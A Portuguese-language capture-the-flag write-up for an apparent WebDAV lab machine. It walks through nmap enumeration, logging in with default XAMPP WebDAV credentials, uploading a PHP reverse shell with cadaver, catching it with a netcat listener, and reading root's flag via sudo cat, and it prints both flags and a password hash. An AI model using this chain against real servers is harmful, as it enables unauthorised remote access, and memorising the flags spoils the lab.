WEBDAV CTF

Para iniciar 

    nmap -A -sV -Pn IP

Encontrei a porta 80 

ao entrar tinha apenas o default do ubuntu, dei um gobuster tambem que nao resultou em nada...

Ate que executei um script do nmap chamado http-enum

    nmap -p 80 --script http-enum IP

Assim encontrando o diretorio /webdav que consiste em uma extensao do http para fazer a transferencias de arquivos, que ao acessar ele pedia um usuario e uma senha tentando admin:admin, admin:admin123 fui buscar por configuracoes padroes do webdav e encontrei nesse link 

    http://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html
    
    user wampp
    pass xampp

Assim conseguindo se conectar ao webdav para entrar pela shell usamos o cadaver

    cadaver http://IP/webdav/

Encontrando um arquivo chamado passwd.dav ao ler o arquivo

    cat passwd.dav
    wampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91

Ao dar um /help vi que tinha alguns comandos que eu podia usar como o comando put usado para introduzir arquivos e foi ai que explorei o servidor, procurando por exploits do webdav encontrei um em que se podia executar um phpreverseshell entao...

Script

    https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

Inserindo o arquivo

    put shellphp.php

Criando o NetCat

    nc -nvlp 1333

Ao executar o arquivo do diretorio /webdav...

SUCESSO!!

Conseguimos acesso ao usuario merlin para localizar a primeira flag vamos ao /home

    cat /home/merlin/user.txt
    449b40fe93f78a938523b7e4dcd66d2a

Agora vamos escalar privilegios...

    sudo -l

Nos podiamos executar o comando "cat" como root...
Sendo assim ficou facil demais 

    sudo cat root/root.txt
    101101ddc16b0cdf65ba0b8a7af7afa5

FLAGS

    FLAG 1: 449b40fe93f78a938523b7e4dcd66d2a
    FLAG 2: 101101ddc16b0cdf65ba0b8a7af7afa5
    
Assim finalizando o desafio..